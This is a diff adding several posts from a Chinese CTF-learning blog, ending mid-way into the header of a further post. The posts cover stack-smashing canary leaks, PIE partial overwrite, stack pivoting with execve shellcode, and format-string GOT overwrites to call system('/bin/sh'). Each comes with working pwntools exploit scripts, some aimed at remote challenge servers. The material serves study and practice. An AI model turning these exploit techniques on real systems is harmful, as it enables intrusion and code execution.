@@ -252,6 +252,1605 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/23/pwn学习（8）smashes练习及回顾/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/23/pwn学习（8）smashes练习及回顾/" itemprop="url">pwn学习（8）smashes练习及一周总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-23T20:27:19+08:00">
+                2018-11-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。</p>
+<h1 id="stack-smashes练习"><a href="#stack-smashes练习" class="headerlink" title="stack smashes练习"></a>stack smashes练习</h1><p>题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxianon45dj312m0n079m.jpg" alt=""><br>首先保护机制就开启了不少，canary、nx都是开启的，ida中很容易看出有栈溢出漏洞，理所当然的没有/bin/sh字符串，也没有system函数。程序的逻辑很简单，让我们输入三次，但要注意因为太调用了fork函数，这三次其实是三个相同的独立过程。说他相同是因为他们的栈结构、逻辑等等都是一样的，说它独立是因为你哪怕因为canary被覆盖搞崩了其中一个，另外两个也会正常运行。</p>
+<p>看了一圈没有leak出canary的机会，那我们就考虑利用smashes来get到点信息，我们首先来简单的调试一下程序，之前做过类似的题目了，我们现在main函数下段来找一下arg0的位置</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxiayuqsnmj313001ojsj.jpg" alt=""></p>
+<p>拿到了arg0的位置，接着尝试在文件操作处下段，主要目的是看看读到的文件内容被存储在了哪里</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxib12tuidj30mw02iq3m.jpg" alt=""><br>明显文件的内容被存储到了栈上，那我们就可以想到可以利用smashes的信息来输出栈上的flag。</p>
+<p>程序给了三次输入的机会，也就是三个smashes的机会，最终我们的目标是输出栈上的值，虽然开启了保护，但我们知道偏移是一定的，所以我们可以找到flag的偏移，然后只要找到基准值就可以算出来flag的真实地址了，那这个基准值是什么呢？答案就是*environ，他指向了栈的环境变量的位置，而我们可以利用libc来获取到environ的位置。</p>
+<p>那就说明我们要分三步走：</p>
+<ul>
+<li>利用smashes获取libc中的函数，比如puts</li>
+<li>利用smashes获取environ</li>
+<li>利用smashes获取flag</li>
+</ul>
+<p>那就来看看exp吧</p>
+<pre><code>from pwn import *
+arg0_addr = 0x7fffffffdf68
+input_addr = 0x7fffffffde40
+#context.log_level = &apos;debug&apos;
+p = process(&apos;./GUESS.dms&apos;)
+elf = ELF(&apos;./GUESS.dms&apos;)
+e = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
+
+flag_addr = 0x7fffffffde10
+puts_addr = 0x602020
+p.recvuntil(&apos;flag&apos;)
+payload = (arg0_addr - input_addr)*&apos;a&apos; +p64(puts_addr)
+p.sendline(payload)
+p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
+puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))
+log.info(hex(puts_addr))
+
+libc = puts_addr - e.symbols[&apos;puts&apos;]
+environ_addr = libc + e.symbols[&apos;__environ&apos;]
+log.info(hex(libc))
+
+p.recvuntil(&apos;flag&apos;)
+p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(environ_addr))
+p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
+stack = u64(p.recv(6).ljust(8, &apos;\x00&apos;))
+log.info(hex(stack))
+
+flag_addr = stack - 0x168
+
+p.recvuntil(&apos;flag&apos;)
+p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(flag_addr))
+
+p.interactive()
+</code></pre><p>各处都不难，位移需要注意的地方是flag偏移值的计算方式，我们运行起来之后可以在environ处下段点，然后查看stack信息，找到flag字符串的位置手动计算一下就好了.</p>
+<h1 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h1><p>这一周主要是学习了基础的ROP和花式溢出，另外还有一些格式化字符串漏洞的相关知识，当然除此之外还有一些pwntools的使用技巧和peda的调试技巧，也不知道这样的速度合不合适，但自己感觉需要好好总结回顾一下了，之后会利用周六把这周的东西重新捋一遍，看看还有没有什么新的发现或者是遗漏。</p>
+<p>sucessful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/22/pwn学习（7）花式栈溢出2/" itemprop="url">pwn学习（7）花式栈溢出2</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T21:58:58+08:00">
+                2018-11-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。</p>
+<h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg" alt=""></p>
+<p>如图就是函数在开始时进行的设置“哨位”</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg" alt=""></p>
+<p>这是在函数最后的检查</p>
+<p>当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg" alt=""></p>
+<p>可以看到除了程序的输出外，还额外打印了一句</p>
+<pre><code>*** stack smashing detected ***: ./smashes.dms terminated
+</code></pre><p>这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理</p>
+<pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
+{
+  __fortify_fail (&quot;stack smashing detected&quot;);
+}
+void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
+{
+  /* The loop is added only to keep gcc happy.  */
+  while (1)
+    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
+                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
+}
+</code></pre><p>可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>知道了原理那就赶紧做个题目练练手吧，题目来自jarvis oj，名字是smashes，大家可以自己去下载一下</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg" alt=""></p>
+<p>保护开启了nx、canary，ida看一下发现有明显的栈溢出漏洞，但还有个很好玩的地方，在我们输入第二个字符串后，它会将某个地址里的内容覆盖掉。我们查看后发现被覆盖掉的地方就是flag的存储位置。</p>
+<p>那么问题来了，不管输入什么我们的flag都会被覆盖，那一定flag就会被改掉吗？当然不是，这里需要一个小知识点了</p>
+<p><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</strong></p>
+<p>我们利用find CTF的方式就可以找到flag的另一处地址，紧接着我们可以在arg0上放入我们的flag地址，借助canary的错误机制将其打印出来，当然过程中需要使用gdb调试来获得包括arg0的地址、变量的地址等等，这就不细说了，直接上脚本了</p>
+<pre><code>from pwn import *
+#p = process(&apos;./smashes.dms&apos;)
+p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
+flag_addr = 0x400d21
+arg0_addr = 0x7fffffffdf48
+name_addr = 0x7fffffffdd30
+payload = (arg0_addr - name_addr)*&apos;a&apos; + p64(flag_addr)
+
+p.recvuntil(&apos;name? &apos;)
+p.sendline(payload)
+p.recvuntil(&apos;flag: &apos;)
+p.sendline(&apos;bb&apos;)
+data = p.recv()
+log.info(data)
+</code></pre><p>要注意因为我们只是拿到了flag并没有get shell，所以最后不进行交互也可以，打印出来就好了</p>
+<h1 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p>
+<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie </p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg" alt=""></p>
+<p>保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了</p>
+<p>那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小</p>
+<p>拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候</p>
+<p>思路齐全，上exp喽</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+#  context.log_level = &quot;debug&quot;
+
+
+while True:
+    try:
+        io = process(&quot;./babypie.dms&quot;, timeout = 1)
+
+        #  gdb.attach(io)
+        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8 + 1))
+        io.recvuntil(&apos;a&apos; * (0x30 - 0x8 + 1))
+        canary = &apos;\0&apos; + io.recvn(7)
+        success(canary.encode(&apos;hex&apos;))
+
+        #  gdb.attach(io)
+        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)
+
+        io.interactive()
+    except Exception as e:
+        io.close()
+        print e
+</code></pre><p>Successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/21/pwn学习（6）花式栈溢出1/" itemprop="url">pwn学习（6）花式栈溢出1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T19:22:14+08:00">
+                2018-11-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。</p>
+<h1 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h1><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控制的内存，bss段、heap等等），然后在这个位置再进行rop。ctf wiki上为我们总结了几种有可能使用到该技巧的情况：</p>
+<ul>
+<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
+<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
+<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
+</ul>
+<p>当然这个用起来还有一些限制条件，最关键的就是你要能控制栈指针</p>
+<h2 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h2><p>原理看完了就拿题目来练练手吧。题目在ctf wiki的github上可以找到。老规矩先拿ida瞅一眼（保护机制检查不说了，这题啥也没有）<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg" alt=""><br>可以看到vul函数很明显有栈溢出漏洞，而且还意外发现有个hint的函数，不得不说出题人挺友好的<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxfx6ydfrjj30h603cwf4.jpg" alt=""><br>可以看到hint函数其实就一句sub esp,0x24 ，估计大家也都会想到了，题目的解决思路应该和这有关。</p>
+<p>很明显是栈溢出，因为没有保护，那我们就考虑能不能直接写入shellcode执行，答案是不行，没有合适的地方让我们存储。题目中没有存储的数组，而溢出后只有14个可用字节，所以shellcode是肯定没有办法按照之前的技巧放入的。这时候就需要用到我们的stack poviting技术了</p>
+<p>因为提示很明显了，让esp减掉了0x24，那我们可以想到，我们完全可以在栈上布置shellcode（没有开启DEP），填充完后让esp减掉某个值，再跳转到对应位置，那我们的shellcode不就被执行了吗。</p>
+<p>说干就干，首先要找到能够让我们劫持栈指针的godget，拿ROPgadget查一下<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxfxlb23qgj30zu06i76o.jpg" alt=""><br>可以看到有jmp esp这个指令，那我们就可以开始我们的exp构造工作了</p>
+<pre><code>from pwn import *
+p = process(&apos;./b0verfl0w.dms&apos;)
+jmp_esp = 0x08048504
+shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+shellcode += &quot;\x0b\xcd\x80&quot;
+sub_jmp = asm(&apos;sub esp,0x28;jmp esp&apos;)
+payload = shellcode.ljust(0x20,&apos;a&apos;) + &apos;aaaa&apos; +p32(jmp_esp) + sub_jmp
+#payload = shellcode + (0x20 - len(shellcode))*&apos;a&apos; + &apos;aaaa&apos; + p32(jmp_esp) + sub_jmp
+p.sendline(payload)
+p.interactive()
+</code></pre><p>为什么是-0x28呢？实际上是pad + ebp + retaddr算出来的，pad是0x20，四位的ebp，四位的retaddr，自然是0x28了，当然你也可以用别的，不过那就需要你自己改一下shellcode的布置了。</p>
+<p>successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/20/pwn学习（5）格式化字符串漏洞2/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/20/pwn学习（5）格式化字符串漏洞2/" itemprop="url">pwn学习（5）格式化字符串漏洞2</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-20T19:36:28+08:00">
+                2018-11-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>昨天看了看格式化字符串漏洞的一些基本内容，今天一方面补全了一下知识，另一方面也做了个题目来练手。</p>
+<h2 id="覆盖任意地址"><a href="#覆盖任意地址" class="headerlink" title="覆盖任意地址"></a>覆盖任意地址</h2><p>首先来看看昨天没有搞完的覆盖内存，昨天我们成功覆盖了栈上的内存改变了局部变量c的值，让程序执行到了我们想要的结果，那程序中还有两个变量a、b（a、b为初始化的全局变量，存储在data段，并不在栈上，详情请看上一篇），能不能将他们的值也改变呢？</p>
+<p>当然可以了，这就是我们内存覆盖的第二个方面—任意地址内存覆盖</p>
+<h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>我们分析程序认识到，我要想输出想要的结果，我们需要把a的值设置为2，b的值设置为0x12345678，那么问题就来了，我们上一次提到的%n是将“打印的个数”写入某个地址，一般的格式是</p>
+<pre><code>addr + %n$n 
+</code></pre><p>而addr作为一个地址长度已经是4了，难道说我们覆盖的最小值只能是4？那当然不是了，我们可以构造下面形式的payload：</p>
+<pre><code>aa%k$nxx + addr
+</code></pre><p>是不是和刚才的有些不一样？这有什么玄机呢？其实很简单，我们之前构造payload时，是找到了我们输入的第一个四个字节所在的栈上的位置进而写入，那么我们也完全可以找到我们输入的第二个四个字节所在的位置（这个位置一想就知道了，就是我们之前找的那个偏移再+1）写入，以此类推。</p>
+<p>上面的字符串其实首先拿aa作为填充字符，和%k凑了四个字节，然后拿$n和xx凑了四个字节，最后的是addr，那addr在栈上的位置也就是原来的偏移6  + 2 也就是8，所以我们的k就是8。万事具备，那我们就上脚本了：</p>
+<pre><code>p = process(&apos;./overwrite.dms&apos;)
+a_addr = 0x804A024
+payload = &apos;aa%8$naa&apos; + p32(a_addr)
+p.sendline(payload)
+print p.recv()
+p.interactive()
+</code></pre><h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>具体原理就不再博客上放了（我也没信心说明白，可以参考ctf wiki，毕竟咱们不能做脚本小子），给一个pwntools给出的函数来一步实现</p>
+<pre><code>payload = fmtstr_payload(offset, {addr:data})
+</code></pre><p>这里的offset也就是咱们求出来的偏移值，addr是你想写入的地址，而data是你想写入的数据。<br>这样我们也可以很轻松的覆盖掉b的值，使程序执行到我们想要的地方，脚本如下</p>
+<pre><code>p = process(&apos;./overwrite.dms&apos;)
+b_addr = 0x804A028
+payload = fmtstr_payload(6, {b_addr:0x12345678})
+p.sendline(payload)
+#print p.recv()
+p.interactive()
+</code></pre><h2 id="自动化寻找偏移值"><a href="#自动化寻找偏移值" class="headerlink" title="自动化寻找偏移值"></a>自动化寻找偏移值</h2><p>Pwntools中同样给出了自动化寻找偏移值的方法，不过还是要在重复一遍，还是要搞明白之前讲的原理，毕竟咱们的目的不是做个脚本小子</p>
+<pre><code>def getoffset(payload):
+    p = process(&quot;./overwrite.dms&quot;)
+    p.sendline(payload)
+    info = p.recv()
+    p.close()
+    return info
+autofmt = FmtStr(getoffset)
+print autofmt.offset
+</code></pre><h2 id="题目实战1"><a href="#题目实战1" class="headerlink" title="题目实战1"></a>题目实战1</h2><p>题目是来自iscc2017的第一道pwn题，链接就不放了，很容易找到，还是老规矩，首先拿ida分析一波</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxeuemhwz8j30om0g8tb6.jpg" alt=""></p>
+<p>可以看到在我们输入name后有一个很明显的格式化字符串漏洞。而在程序中没有可以供我们利用的/bin/sh字符串和system函数，那我们就要考虑人为的创造他们了。</p>
+<p>/bin/sh字符串好说，因为程序存在输入，我们完全可以直接写进去，但system函数怎么办呢？前面说了利用这个漏洞我们可以实现任意地址的泄漏和写入，那我们可以首先泄漏某个函数的libc地址，然后计算出system的地址写入（因为got表表是可写的）之前的那个函数，这就相当于把之前的函数“变成”了system，拿选谁比较合适呢？当然是printf了，因为printf的参数恰好就是我们输入的字符，那我们把printf代替之后就可以直接执行system(“/bin/sh”)了</p>
+<p>思路有了，上exp！</p>
+<pre><code>from pwn import *
+#context.log_level = &apos;debug&apos;
+
+libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
+elf = ELF(&quot;./pwn1&quot;)
+got_printf = elf.got[&apos;printf&apos;]
+p = process(&quot;./pwn1&quot;)
+p.recvuntil(&quot;input$&quot;)
+p.sendline(&apos;1&apos;)
+p.recvuntil(&apos;please input your name:\n&apos;)
+payload = p32(got_printf) + &quot;%6$s&quot;
+p.sendline(payload)
+printf_addr_and_xxx = p.recvuntil(&quot;,you&quot;)
+printf_addr = u32(printf_addr_and_xxx[4:8])
+print &quot;printf_addr = &quot; + hex(printf_addr)
+system_addr = printf_addr - (libc.symbols[&apos;printf&apos;] - libc.symbols[&apos;system&apos;])
+print &quot;system_addr = &quot; + hex(system_addr)
+
+p.recvuntil(&quot;input$&quot;)
+p.sendline(&apos;1&apos;)
+p.recvuntil(&apos;please input your name:\n&apos;)
+
+payload2 = fmtstr_payload(6, {got_printf: system_addr})
+p.sendline(payload2)
+
+p.sendline(&apos;1&apos;)
+p.recvuntil(&apos;please input your name:\n&apos;)
+p.sendline(&apos;/bin/sh\0&apos;)
+
+p.interactive()
+</code></pre><h2 id="题目实战2"><a href="#题目实战2" class="headerlink" title="题目实战2"></a>题目实战2</h2><p>第二个例题是2018山东省赛的pwn的铜牌题目，题目在学校的平台上有，难度不是很大，首先还是ida看一下</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxexaabnswj30wm0ekq5s.jpg" alt=""></p>
+<p>可以看到很明显是格式化字符串漏洞，再看一下题目还给个getFlag函数能直接显示flag，不过想要执行这个函数还需要number等于0x2018</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxexeowvb4j30cy06m74u.jpg" alt=""></p>
+<p>那思路就有了，我们可以首先改写计数器total count来多次执行这个漏洞，紧接着再利用任意地址覆盖使得number变为0x2018</p>
+<p>最后我们找个getFlag函数的“替身”，这里我们可以看到选择</p>
+<p>当然在做这些之前还是需要找到偏移的，可以手动也可以直接用之前自动化的脚本，最后的exp如下：</p>
+<pre><code>from pwn import *
+p = remote(&quot;47.105.148.65&quot;,9999)
+count_addr = 0x804A064
+num_addr = 0x804A060
+put_addr = 0x804A01C
+flag_addr = 0x8048616
+payload = fmtstr_payload(4,{count_addr:0x3})
+p.sendline(payload)
+payload = fmtstr_payload(4,{num_addr:0x2018})
+p.sendline(payload)
+payload = fmtstr_payload(4,{put_addr:flag_addr})
+p.sendline(payload)
+p.interactive()
+</code></pre><p>successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/pwn学习（4）初识格式化字符串漏洞/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/19/pwn学习（4）初识格式化字符串漏洞/" itemprop="url">pwn学习（4）初识格式化字符串漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
